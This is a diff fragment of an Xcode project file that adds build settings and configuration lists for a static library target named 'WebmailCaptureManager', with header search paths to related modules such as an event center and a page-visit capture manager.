+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu99;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				MACOSX_DEPLOYMENT_TARGET = 10.10;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				SDKROOT = macosx;
+			};
+			name = Release;
+		};
+		C2D863F91A84BACE00D7D506 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				CLANG_ENABLE_OBJC_ARC = NO;
+				EXECUTABLE_PREFIX = lib;
+				GCC_PREFIX_HEADER = WebmailCaptureManager_Prefix.pch;
+				ONLY_ACTIVE_ARCH = NO;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				USER_HEADER_SEARCH_PATHS = "../../Std/FxStd ../../FMDB/FMDB_2.4/src/** ../../Events/FxEvents ../../EventCenter/Source-EventCenter ../../SystemUtils/Source-SystemUtils ../../IPC/Source-IPC ../../PageVisitedCaptureManager/Source-PageVisitedCaptureManager/**";
+			};
+			name = Debug;
+		};
+		C2D863FA1A84BACE00D7D506 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				CLANG_ENABLE_OBJC_ARC = NO;
+				EXECUTABLE_PREFIX = lib;
+				GCC_PREFIX_HEADER = WebmailCaptureManager_Prefix.pch;
+				ONLY_ACTIVE_ARCH = NO;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				USER_HEADER_SEARCH_PATHS = "../../Std/FxStd ../../FMDB/FMDB_2.4/src/** ../../Events/FxEvents ../../EventCenter/Source-EventCenter ../../SystemUtils/Source-SystemUtils ../../IPC/Source-IPC ../../PageVisitedCaptureManager/Source-PageVisitedCaptureManager/**";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		C2D863DF1A84BACE00D7D506 /* Build configuration list for PBXProject "WebmailCaptureManager" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C2D863F61A84BACE00D7D506 /* Debug */,
+				C2D863F71A84BACE00D7D506 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C2D863F81A84BACE00D7D506 /* Build configuration list for PBXNativeTarget "WebmailCaptureManager" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C2D863F91A84BACE00D7D506 /* Debug */,
+				C2D863FA1A84BACE00D7D506 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = C2D863DC1A84BACE00D7D506 /* Project object */;
+}
